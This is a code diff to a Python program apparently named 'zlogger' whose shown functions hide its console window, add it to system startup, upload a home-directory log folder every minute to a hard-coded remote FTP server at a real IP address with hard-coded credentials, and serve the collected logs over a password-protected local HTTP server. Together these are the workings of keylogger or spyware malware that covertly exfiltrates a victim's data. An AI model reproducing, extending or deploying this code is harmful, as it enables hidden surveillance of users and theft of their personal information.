@@ -10,7 +10,6 @@ import base64
 import socketserver
 import platform
 
-
 # get the user name as identifier
 def user_name():
     user_name = str(socket.gethostname())
@@ -39,7 +38,6 @@ def hide_console():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window,0)
     return True
-
 
 def add_startup():
     # in python __file__ is the instant of file path where it was executed
@@ -96,21 +94,21 @@ def active_interface():
     return active_interface
 
 # Upload log directory to ftp server
-def sync():
+def sync(ftp_host="20.124.217.64",ftp_username="zlogger",ftp_passward="zlogger"):
     home_path = os.path.expanduser("~")
     dir_list = os.listdir(home_path)
     if "zlogger" in dir_list:
         source_path = os.path.join(home_path, "zlogger")
         target_path = "/var/www/html/"
 
-    SYNC = SyncFtp("20.124.217.64", "zlogger", "zlogger")
+    SYNC = SyncFtp(ftp_host, ftp_username, ftp_passward)
     
     while True:
         if is_connected() == True:
-            print("Internet is available. Syncing to the ftp..")
+            print("Internet is available. Syncing to the ftp.. \n ")
             SYNC.send_to_ftp(source_path, target_path)
         else:
-            print("No internet! Checking for internet connectivity..")
+            print("No internet! Checking for internet connectivity.. \n ")
         time.sleep(60)
 
 #Creating local server
@@ -132,7 +130,7 @@ class AuthHandler(http.server.SimpleHTTPRequestHandler):
             self.send_error(400, "Bad request")
             return
         username, password = base64.b64decode(auth_parts[1]).decode().split(":")
-        if username != "admin" or password != "12345":
+        if username != "zlogger" or password != "zlogger":
             self.send_error(403, "Forbidden")
             return
         super().do_GET()
@@ -140,7 +138,6 @@ class AuthHandler(http.server.SimpleHTTPRequestHandler):
 def server():
     PORT = 8000
     DIRECTORY = "./"
-
     with socketserver.TCPServer(("", PORT), AuthHandler) as httpd:
-        print("Local server running at http://localhost:8000")
+        print("Local server running at http://localhost:8000 default username and passward is: 'zlogger' \n ")
         httpd.serve_forever()
